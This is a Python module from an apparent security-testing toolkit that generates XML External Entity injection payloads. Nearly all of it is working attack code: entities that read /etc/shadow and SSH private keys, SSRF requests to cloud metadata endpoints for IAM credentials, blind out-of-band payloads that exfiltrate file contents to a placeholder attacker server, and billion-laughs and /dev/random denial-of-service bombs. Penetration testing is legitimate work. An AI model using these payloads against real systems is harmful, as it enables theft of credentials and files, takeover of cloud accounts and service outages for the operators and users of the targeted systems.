"""
AIPT XXE Payloads
=================

XML External Entity (XXE) Injection payloads for security testing.
Covers file disclosure, SSRF, DoS, and blind XXE detection.
"""
from __future__ import annotations

from typing import Iterator
from dataclasses import dataclass


@dataclass
class XXEPayload:
    """XXE payload with metadata."""
    payload: str
    name: str
    category: str
    description: str


class XXEPayloads:
    """
    XXE payload generator.

    Categories:
    - File disclosure: Read local files
    - SSRF: Server-side request forgery via XXE
    - DoS: Billion laughs / XML bomb
    - Blind XXE: Out-of-band exfiltration
    - Parameter entities: Alternative injection vectors

    Example:
        xxe = XXEPayloads()
        for payload in xxe.file_disclosure():
            test_xml_endpoint(payload)
    """

    # Common files to exfiltrate
    LINUX_FILES = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/proc/self/environ",
        "/proc/version",
        "/home/.ssh/id_rsa",
        "/root/.ssh/id_rsa",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
    ]

    WINDOWS_FILES = [
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/Windows/win.ini",
        "C:/Windows/system.ini",
        "C:/inetpub/wwwroot/web.config",
        "C:/Users/Administrator/.ssh/id_rsa",
    ]

    @classmethod
    def file_disclosure(cls, target_file: str = "/etc/passwd") -> Iterator[XXEPayload]:
        """
        File disclosure payloads - read local files.

        Args:
            target_file: File path to read (default: /etc/passwd)
        """
        payloads = [
            # Basic XXE - DOCTYPE with ENTITY
            XXEPayload(
                payload=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<root>&xxe;</root>''',
                name="basic_file_xxe",
                category="file_disclosure",
                description=f"Basic XXE to read {target_file}"
            ),

            # XXE with nested element
            XXEPayload(
                payload=f'''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file://{target_file}">
]>
<data><content>&file;</content></data>''',
                name="nested_element_xxe",
                category="file_disclosure",
                description="XXE with nested content element"
            ),

            # PHP filter for base64 encoding (bypasses some parsers)
            XXEPayload(
                payload=f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={target_file}">
]>
<foo>&xxe;</foo>''',
                name="php_filter_xxe",
                category="file_disclosure",
                description="XXE using PHP filter for base64 encoding"
            ),

            # UTF-16 encoding bypass
            XXEPayload(
                payload=f'''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<foo>&xxe;</foo>''',
                name="utf16_xxe",
                category="file_disclosure",
                description="XXE with UTF-16 encoding to bypass filters"
            ),

            # CDATA wrapper for special characters
            XXEPayload(
                payload=f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<foo><![CDATA[&xxe;]]></foo>''',
                name="cdata_xxe",
                category="file_disclosure",
                description="XXE with CDATA section"
            ),

            # Parameter entity for internal subset
            XXEPayload(
                payload=f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{target_file}">
  <!ENTITY % eval "<!ENTITY xxe SYSTEM 'file://{target_file}'>">
  %eval;
]>
<foo>&xxe;</foo>''',
                name="parameter_entity_xxe",
                category="file_disclosure",
                description="XXE using parameter entities"
            ),

            # XInclude attack (when DOCTYPE is disabled)
            XXEPayload(
                payload=f'''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file://{target_file}"/>
</foo>''',
                name="xinclude_xxe",
                category="file_disclosure",
                description="XInclude attack (bypasses DOCTYPE restrictions)"
            ),
        ]
        yield from payloads

    @classmethod
    def ssrf(cls, callback_url: str = "http://169.254.169.254/latest/meta-data/") -> Iterator[XXEPayload]:
        """
        SSRF via XXE - make server-side requests.

        Args:
            callback_url: URL to fetch (default: AWS metadata)
        """
        urls = [
            callback_url,
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
            "http://127.0.0.1:80/",
            "http://127.0.0.1:8080/",
            "http://localhost:22/",
            "http://[::1]/",
            "gopher://127.0.0.1:25/",  # SMTP
            "ftp://127.0.0.1:21/",
        ]

        for url in urls:
            yield XXEPayload(
                payload=f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{url}">
]>
<foo>&xxe;</foo>''',
                name=f"ssrf_xxe_{url.split('/')[2].replace('.', '_')[:20]}",
                category="ssrf",
                description=f"XXE SSRF to {url[:50]}"
            )

    @classmethod
    def blind_oob(cls, attacker_server: str = "ATTACKER_SERVER") -> Iterator[XXEPayload]:
        """
        Blind/Out-of-Band XXE payloads.
        Exfiltrate data when no direct response is visible.

        Args:
            attacker_server: Your server to receive exfiltrated data
        """
        payloads = [
            # Basic OOB XXE
            XXEPayload(
                payload=f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{attacker_server}/xxe.dtd">
  %xxe;
]>
<foo>test</foo>''',
                name="basic_oob_xxe",
                category="blind",
                description="Basic blind XXE with external DTD"
            ),

            # OOB with data exfiltration
            XXEPayload(
                payload=f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://{attacker_server}/exfil.dtd">
  %dtd;
]>
<foo>&send;</foo>''',
                name="oob_exfil_xxe",
                category="blind",
                description="Blind XXE with data exfiltration"
            ),

            # Error-based XXE (data in error message)
            XXEPayload(
                payload=f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo>test</foo>''',
                name="error_based_xxe",
                category="blind",
                description="Error-based XXE (file content in error)"
            ),

            # DNS-based detection
            XXEPayload(
                payload=f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe.{attacker_server}/">
]>
<foo>&xxe;</foo>''',
                name="dns_xxe",
                category="blind",
                description="DNS-based XXE detection"
            ),
        ]
        yield from payloads

    @classmethod
    def dos(cls) -> Iterator[XXEPayload]:
        """
        Denial of Service XXE payloads.
        WARNING: These can crash servers. Use carefully.
        """
        payloads = [
            # Billion Laughs (XML Bomb) - exponential expansion
            XXEPayload(
                payload='''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>''',
                name="billion_laughs",
                category="dos",
                description="Billion Laughs XML Bomb (exponential expansion)"
            ),

            # Quadratic Blowup
            XXEPayload(
                payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
]>
<foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>''',
                name="quadratic_blowup",
                category="dos",
                description="Quadratic Blowup attack"
            ),

            # External entity recursion
            XXEPayload(
                payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<foo>&xxe;</foo>''',
                name="dev_random_dos",
                category="dos",
                description="DoS via /dev/random (infinite read)"
            ),
        ]
        yield from payloads

    @classmethod
    def all_payloads(cls, target_file: str = "/etc/passwd",
                     callback_url: str = "http://ATTACKER/") -> Iterator[XXEPayload]:
        """Generate all XXE payloads."""
        yield from cls.file_disclosure(target_file)
        yield from cls.ssrf(callback_url)
        yield from cls.blind_oob("ATTACKER_SERVER")
        # Note: DoS payloads excluded from 'all' for safety

    @classmethod
    def detection_payloads(cls) -> Iterator[XXEPayload]:
        """
        Safe detection payloads to check if XXE is possible.
        These don't exfiltrate data, just detect vulnerability.
        """
        payloads = [
            # Simple entity expansion test
            XXEPayload(
                payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe "XXE_VULNERABLE">
]>
<foo>&xxe;</foo>''',
                name="entity_expansion_test",
                category="detection",
                description="Test if internal entities are processed"
            ),

            # External DTD test
            XXEPayload(
                payload='''<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://xxe-test.attacker.com/test.dtd">
<foo>test</foo>''',
                name="external_dtd_test",
                category="detection",
                description="Test if external DTDs are fetched"
            ),

            # Parameter entity test
            XXEPayload(
                payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % test "XXE_PARAM_ENTITY">
  <!ENTITY xxe "%test;">
]>
<foo>&xxe;</foo>''',
                name="param_entity_test",
                category="detection",
                description="Test if parameter entities work"
            ),
        ]
        yield from payloads


# Convenience function
def get_xxe_payloads(category: str = "all", target_file: str = "/etc/passwd") -> list[str]:
    """
    Get XXE payloads by category.

    Args:
        category: 'file', 'ssrf', 'blind', 'dos', 'detection', or 'all'
        target_file: Target file for file disclosure payloads

    Returns:
        List of payload strings
    """
    xxe = XXEPayloads()
    if category == "file":
        return [p.payload for p in xxe.file_disclosure(target_file)]
    elif category == "ssrf":
        return [p.payload for p in xxe.ssrf()]
    elif category == "blind":
        return [p.payload for p in xxe.blind_oob()]
    elif category == "dos":
        return [p.payload for p in xxe.dos()]
    elif category == "detection":
        return [p.payload for p in xxe.detection_payloads()]
    else:
        return [p.payload for p in xxe.all_payloads(target_file)]


__all__ = [
    "XXEPayload",
    "XXEPayloads",
    "get_xxe_payloads",
]
